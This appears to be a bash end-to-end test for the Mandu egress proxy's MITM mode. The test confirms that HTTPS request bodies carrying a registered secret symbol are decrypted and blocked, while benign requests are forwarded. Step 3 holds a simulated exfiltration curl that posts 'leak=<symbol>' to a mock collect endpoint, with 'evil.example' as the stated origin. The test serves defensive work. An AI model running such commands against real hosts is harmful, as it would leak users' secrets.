#!/usr/bin/env bash
#
# FROZEN (protection-modes.md §10.7): the integrity form of
# launcher/test/net-proxy-mitm-live.test.sh, moved here verbatim on 2026-09-29 (only the
# relative paths changed). The default lane runs that file's `secrets` form.
# Runs only with MANDU_EXPERIMENTAL_INTEGRITY=1 (its tests/suites.mjs entry,
# tier frozen); it still picks its ports with free_port (the §8.4 race).
#
# net-proxy-mitm-live.test.sh — LIVE e2e oracle: the Mandu NETWORK egress gate,
# in OPT-IN MITM mode, gates HTTPS REQUEST BODIES end-to-end through the launcher's
# `mandu-run.sh --net-proxy-mitm`.
#
# This is the HTTPS analogue of net-proxy-live.test.sh. The difference is the new
# capability a blind CONNECT tunnel CANNOT provide: a $MDU:* symbol smuggled
# in an HTTPS request BODY is decrypted (the proxy terminates TLS with a session
# CA the agent trusts via CURL_CA_BUNDLE the launcher set), gated by the arbiter's
# data-usage policy, and BLOCKED (curl sees 403, the destination receives NOTHING)
# — while a benign HTTPS request is decrypted, forwarded, and DELIVERED.
#
# Offline + unprivileged: a real arbiter daemon on a temp socket; a LOCAL HTTPS
# mock destination on an alternate loopback IP (127.0.0.2, NOT in NO_PROXY) with a
# self-signed cert; the launcher autostarts the MITM net-proxy and reaps it. To
# stay offline we pass MANDU_NET_PROXY_MITM_INSECURE_UPSTREAM=1 so the proxy's
# RE-ORIGINATION to the self-signed mock dest doesn't need the host system store
# (TEST ONLY — in production the upstream IS verified). The CLIENT side (curl)
# still does a real TLS verify against the launcher-wired CURL_CA_BUNDLE.
#
# SKIPs cleanly (exit 0) when openssl / curl / node / npm are unavailable, the
# arbiter / net-proxy deps are not installed, or 127.0.0.2 can't be bound — those
# are environment gaps, not failures.
#
# Run:  MANDU_EXPERIMENTAL_INTEGRITY=1 bash launcher/test/integrity/net-proxy-mitm-live.test.sh
#
set -uo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
LAUNCHER="$HERE/../../mandu-run.sh"
# mandu-run.sh now shims the TS launcher, which turns ON every rung by default.
# This oracle tests ONLY the net-proxy MITM HTTPS-body gate, so isolate it: disable
# the other rungs via env (fs-sync's worktree, the kernel confines, the exec-wrap
# that would block the symbol-bearing curl first, the model proxy, the reply filter)
# so the decrypted-body 403 is attributable to the MITM net-proxy alone.
export MANDU_FS_SYNC=0 MANDU_NO_KERNEL=1 MANDU_NO_CONTEXT_PROXY=1 MANDU_EXEC_WRAP=0 MANDU_REPLY_FILTER=0
# The rung banners this oracle greps print only under --verbose since the
# one-line default display (launch-banner.ts, release checklist a6).
export MANDU_VERBOSE=1
# This suite STATES its axes (docs/design/architecture/protection-modes.md §4): the arbiter it
# spawns and the launcher it runs both read these, so a change of the built-in
# default can never quietly change what the suite proves. STRICT makes an
# unstated axis a startup error in the arbiter.
export MANDU_AXES_STRICT=1 MANDU_INTEGRITY=1 MANDU_CONFIDENTIALITY=0
REPO_ROOT="$(cd "$HERE/../../.." && pwd)"
ARBITER_DIR="$REPO_ROOT/arbiter"
ARBITER_MAIN="$ARBITER_DIR/ipc/server-main.ts"
ARBITER_TSX="$ARBITER_DIR/node_modules/.bin/tsx"
EGRESS_DIR="$REPO_ROOT/interceptors/net-proxy"

PASS=0
FAIL=0
pass() { echo "PASS: $1"; PASS=$((PASS + 1)); }
fail() { echo "FAIL: $1"; FAIL=$((FAIL + 1)); }

skip() {
  echo "SKIP: $1"
  echo "─────────────────────────────────────────"
  echo "net-proxy-mitm-live.test.sh: 0 passed, 0 failed (skipped)"
  exit 0
}

# ── 0. environment gates (skip, not fail, on a missing toolchain) ─────────────
command -v openssl >/dev/null 2>&1 || skip "openssl not on PATH — MITM mode needs it to mint the session CA"
command -v curl    >/dev/null 2>&1 || skip "curl not on PATH — cannot drive the proxy"
command -v node    >/dev/null 2>&1 || skip "node not on PATH — cannot run the mock destination / arbiter client"
command -v npm     >/dev/null 2>&1 || skip "npm not on PATH — the launcher cannot autostart the net-proxy"
[[ -x "$ARBITER_TSX" ]] || skip "arbiter tsx not installed ($ARBITER_TSX) — run 'cd arbiter && npm install'"
[[ -f "$EGRESS_DIR/package.json" && -d "$EGRESS_DIR/node_modules" ]] \
  || skip "net-proxy deps not installed ($EGRESS_DIR) — run 'cd interceptors/net-proxy && npm install'"

# ── 1. scratch dirs + a real arbiter daemon on a temp socket ───────────────────
WORK="$(mktemp -d "${TMPDIR:-/tmp}/mandu-mitm-live.XXXXXX")" || skip "mktemp failed"
# The Mandu home: a temp one under $WORK with no config.toml, so no host
# ~/.mandu/config.toml is read (the 7cdfc2c e2e rule) and nothing lands in the
# real home; the arbiter and every launch below inherit it.
export MANDU_HOME="$WORK/mandu-home"
ARBITER_SOCK="$WORK/arbiter.sock"

# The mock UNTRUSTED HTTPS destination binds to 127.0.0.2 (NOT 127.0.0.1), which is
# NOT in the launcher's NO_PROXY (loopback is excluded), so curl routes it THROUGH
# the egress proxy — exercising the gate exactly like a real remote destination.
DEST_HOST="127.0.0.2"
# Since 2026-10-05 the net-proxy relays nothing to this machine (127.0.0.2
# included: net-proxy blocked-destinations.ts): the agent names the
# destination $DEST_NAME, which a mock-sites host route sends to the listener.
DEST_NAME="dest.mandu.test"

free_port() {
  node -e 'const s=require("net").createServer();s.listen(0,process.argv[1],()=>{process.stdout.write(String(s.address().port));s.close();});' "$1"
}

MOCKPORT="$(free_port "$DEST_HOST" 2>/dev/null)"
[[ -n "$MOCKPORT" ]] || skip "cannot bind $DEST_HOST (alternate loopback unavailable) — cannot place a non-NO_PROXY destination"
ROUTES="$WORK/routes.yaml"
printf 'hosts:\n  - host: "%s"\n    tls_to: "%s:%s"\n' "$DEST_NAME" "$DEST_HOST" "$MOCKPORT" > "$ROUTES"
EPORT="$(free_port 127.0.0.1)"
[[ -n "$EPORT" ]] || skip "could not allocate a free port for the net-proxy"

# ── 1a. mint a self-signed cert for the HTTPS mock destination (SAN IP=DEST) ──
# This is the UPSTREAM's cert. The proxy re-originates with INSECURE_UPSTREAM=1
# (test only), so it need not chain anywhere; curl never sees this cert (curl talks
# to the proxy's terminated leaf, trusting the launcher-wired session CA).
DEST_KEY="$WORK/dest.key"
DEST_CERT="$WORK/dest.pem"
DEST_EXT="$WORK/dest.ext"
openssl ecparam -genkey -name prime256v1 -out "$DEST_KEY" 2>/dev/null
DEST_CSR="$WORK/dest.csr"
openssl req -new -key "$DEST_KEY" -subj "/CN=$DEST_HOST" -out "$DEST_CSR" 2>/dev/null
printf 'basicConstraints=CA:FALSE\nkeyUsage=digitalSignature,keyEncipherment\nextendedKeyUsage=serverAuth\nsubjectAltName=IP:%s\n' "$DEST_HOST" > "$DEST_EXT"
# Self-sign (the dest is its own CA here; INSECURE_UPSTREAM lets the proxy accept it).
openssl x509 -req -in "$DEST_CSR" -signkey "$DEST_KEY" -days 5 -sha256 -extfile "$DEST_EXT" -out "$DEST_CERT" 2>/dev/null
[[ -s "$DEST_CERT" ]] || skip "could not mint the mock HTTPS destination cert"

arbiter_pid=""
mock_pid=""
cleanup() {
  [[ -n "$mock_pid" ]] && kill "$mock_pid" 2>/dev/null || true
  [[ -n "$arbiter_pid" ]] && { kill -- "-$arbiter_pid" 2>/dev/null || kill "$arbiter_pid" 2>/dev/null || true; }
  rm -rf "$WORK" 2>/dev/null || true
}
trap cleanup EXIT
# Lifeline backstop (lib/lifeline.sh): reaps the arbiter if this shell dies
# without its trap (SIGKILL / abandoned hang).
source "$(dirname "${BASH_SOURCE[0]}")/../lib/lifeline.sh"
mdu_lifeline_init "$WORK"

echo "[1/?] booting the arbiter daemon on $ARBITER_SOCK ..."
setsid env MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
           MANDU_HOME="$MANDU_HOME" \
           MANDU_LIFELINE=stdin \
  "$ARBITER_TSX" "$ARBITER_MAIN" "$ARBITER_SOCK" <"$MANDU_LIFELINE_FIFO" 9>&- >"$WORK/arbiter.log" 2>&1 &
arbiter_pid=$!

tries=200
while (( tries-- > 0 )); do
  [[ -S "$ARBITER_SOCK" ]] && break
  kill -0 "$arbiter_pid" 2>/dev/null || { cat "$WORK/arbiter.log" >&2; skip "arbiter daemon failed to start"; }
  sleep 0.1
done
[[ -S "$ARBITER_SOCK" ]] || { cat "$WORK/arbiter.log" >&2; skip "arbiter socket never appeared"; }
echo "      arbiter up (pid $arbiter_pid)."

# ── 1b. REGISTER a real untrusted symbol in the arbiter (symbolize) ────────────
echo "[1b/?] registering an untrusted symbol via the arbiter (symbolize) ..."
SECRET="TOPSECRET_$$_$RANDOM"
SYMBOL="$(node -e '
  const net = require("net");
  const c = net.connect(process.argv[1], () => {
    c.write(JSON.stringify({ id: 1, op: "symbolize", tool: "web_fetch", value: process.argv[2], origin: "https://evil.example" }) + "\n");
  });
  let buf = "";
  c.setEncoding("utf8");
  c.on("data", (d) => {
    buf += d;
    const nl = buf.indexOf("\n");
    if (nl < 0) return;
    const resp = JSON.parse(buf.slice(0, nl));
    c.end();
    if (resp && resp.ok && resp.result && resp.result.symbol) { process.stdout.write(resp.result.symbol); process.exit(0); }
    process.stderr.write("symbolize failed: " + buf); process.exit(1);
  });
  c.on("error", (e) => { process.stderr.write(String(e)); process.exit(1); });
  setTimeout(() => { process.stderr.write("symbolize timed out"); process.exit(1); }, 5000);
' "$ARBITER_SOCK" "$SECRET" 2>"$WORK/symbolize.err")"
if [[ -z "$SYMBOL" || "$SYMBOL" != *'$MDU:'* ]]; then
  cat "$WORK/symbolize.err" >&2 || true
  skip "could not register a symbol via the arbiter (symbolize op) — got: '$SYMBOL'"
fi
echo "      registered symbol: $SYMBOL"

# ── 2. a mock UNTRUSTED HTTPS destination that records every request body ─────
RECV="$WORK/received.txt"
: > "$RECV"
echo "[2/?] starting the mock untrusted HTTPS destination on $DEST_HOST:$MOCKPORT ..."
node -e '
  const https = require("https");
  const fs = require("fs");
  const host = process.argv[1];
  const port = Number(process.argv[2]);
  const recv = process.argv[3];
  const key = fs.readFileSync(process.argv[4]);
  const cert = fs.readFileSync(process.argv[5]);
  const srv = https.createServer({ key, cert }, (req, res) => {
    const chunks = [];
    req.on("data", (c) => chunks.push(c));
    req.on("end", () => {
      fs.appendFileSync(recv, Buffer.concat(chunks).toString("utf8") + "\n");
      res.writeHead(200, { "content-type": "text/plain" });
      res.end("ok-https");
    });
  });
  srv.listen(port, host, () => { process.stderr.write("mock-https-dest ready\n"); });
' "$DEST_HOST" "$MOCKPORT" "$RECV" "$DEST_KEY" "$DEST_CERT" >"$WORK/mock.log" 2>&1 &
mock_pid=$!

tries=100
while (( tries-- > 0 )); do
  ( exec 3<>"/dev/tcp/$DEST_HOST/$MOCKPORT" ) 2>/dev/null && break
  kill -0 "$mock_pid" 2>/dev/null || { cat "$WORK/mock.log" >&2; skip "mock HTTPS destination failed to start"; }
  sleep 0.05
done
echo "      mock HTTPS destination up (pid $mock_pid), recording to $RECV."

# Common launcher env: temp arbiter, no autostart, MITM on, insecure upstream (test).
launcher_env() {
  echo "MANDU_ARBITER_SOCK=$ARBITER_SOCK"
  echo "MANDU_NO_ARBITER_AUTOSTART=1"
  echo "MANDU_NET_PROXY_PORT=$EPORT"
  echo "MANDU_NET_PROXY_MITM_INSECURE_UPSTREAM=1"
}

# ── 3. EXFIL attempt: a symbol in the HTTPS BODY → MUST be BLOCKED (403) ───────
# curl uses the CURL_CA_BUNDLE the launcher wires (the session CA) to trust the
# proxy's terminated leaf for $DEST_HOST. The proxy decrypts the body, sees the
# untrusted symbol bound for an untrusted destination → 403, and forwards NOTHING.
echo "[3/?] EXFIL attempt over HTTPS through the launcher (expect curl 403, dest receives NOTHING) ..."
exfil_out="$(
  MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
  MANDU_NO_ARBITER_AUTOSTART=1 \
  MANDU_NET_PROXY_PORT="$EPORT" \
  MANDU_NET_PROXY_MOCK_SITES="$ROUTES" \
  MANDU_NET_PROXY_MITM_INSECURE_UPSTREAM=1 \
  MANDU_TEST_SYM="$SYMBOL" \
  bash "$LAUNCHER" --target claude --net-proxy-mitm --no-scope --no-mcp -- \
    bash -c 'curl -s -o /dev/null -w "%{http_code}" --data "leak=${MANDU_TEST_SYM}" https://'"${DEST_NAME}"'/collect' \
    2>"$WORK/exfil.err"
)"
exfil_rc=$?

if grep -q "proceeding with plain --net-proxy\|proceeding WITHOUT the network egress gate\|HTTPS is effectively blind-tunneled" "$WORK/exfil.err"; then
  echo "--- launcher stderr (degraded) ---" >&2; cat "$WORK/exfil.err" >&2
  fail "launcher degraded out of MITM mode — HTTPS bodies were NOT gated (see stderr above)"
fi

echo "      curl http_code: '$exfil_out' (launcher rc=$exfil_rc)"
if [[ "$exfil_out" == "403" ]]; then
  pass "EXFIL: a symbol in the HTTPS BODY → curl saw 403 (the MITM gate decrypted + BLOCKED it)"
else
  echo "--- launcher stderr (exfil) ---" >&2; cat "$WORK/exfil.err" >&2
  fail "EXFIL over HTTPS was NOT blocked; expected curl '403', got '$exfil_out'"
fi

recv_after_exfil="$(cat "$RECV" 2>/dev/null)"
if [[ -z "$recv_after_exfil" ]]; then
  pass "the untrusted HTTPS destination received NOTHING (the secret never left the proxy)"
else
  fail "the destination RECEIVED data on the blocked HTTPS exfil: $recv_after_exfil"
fi
if [[ "$recv_after_exfil" == *"$SECRET"* ]]; then
  fail "the raw secret LEAKED to the destination over HTTPS: $recv_after_exfil"
fi

# ── 4. BENIGN HTTPS request: no symbol → MUST PASS and be DELIVERED ────────────
echo "[4/?] BENIGN HTTPS request through the launcher (expect curl 200, dest receives hello=world) ..."
: > "$RECV"
benign_out="$(
  MANDU_ARBITER_SOCK="$ARBITER_SOCK" \
  MANDU_NO_ARBITER_AUTOSTART=1 \
  MANDU_NET_PROXY_PORT="$EPORT" \
  MANDU_NET_PROXY_MOCK_SITES="$ROUTES" \
  MANDU_NET_PROXY_MITM_INSECURE_UPSTREAM=1 \
  bash "$LAUNCHER" --target claude --net-proxy-mitm --no-scope --no-mcp -- \
    bash -c "curl -s -o /dev/null -w '%{http_code}' --data 'hello=world' https://${DEST_NAME}/collect" \
    2>"$WORK/benign.err"
)"
benign_rc=$?
echo "      curl http_code: '$benign_out' (launcher rc=$benign_rc)"
if [[ "$benign_out" == "200" ]]; then
  pass "BENIGN symbol-free HTTPS request → curl saw 200 (decrypted + forwarded through the gate)"
else
  echo "--- launcher stderr (benign) ---" >&2; cat "$WORK/benign.err" >&2
  fail "BENIGN HTTPS request did NOT pass; expected curl '200', got '$benign_out'"
fi

recv_after_benign="$(cat "$RECV" 2>/dev/null)"
if [[ "$recv_after_benign" == *"hello=world"* ]]; then
  pass "the destination RECEIVED the decrypted benign body (hello=world) — MITM forward works"
else
  fail "the destination did NOT receive the benign body; got: '$recv_after_benign'"
fi

# ── 5. the launcher logged MITM LIVE + autostarted the net-proxy ───────────
echo "[5/?] checking the launcher logged MITM LIVE ..."
if grep -qF "MITM: HTTPS request bodies gated" "$WORK/exfil.err" "$WORK/benign.err" 2>/dev/null; then
  pass "the launcher logged the MITM gate LIVE (HTTPS request bodies gated)"
else
  echo "--- launcher stderr (exfil) ---" >&2; cat "$WORK/exfil.err" >&2
  fail "the launcher did not log MITM LIVE"
fi

# ── summary ───────────────────────────────────────────────────────────────────
echo "─────────────────────────────────────────"
echo "net-proxy-mitm-live.test.sh: $PASS passed, $FAIL failed"
if [[ "$FAIL" -gt 0 ]]; then
  exit 1
fi
exit 0
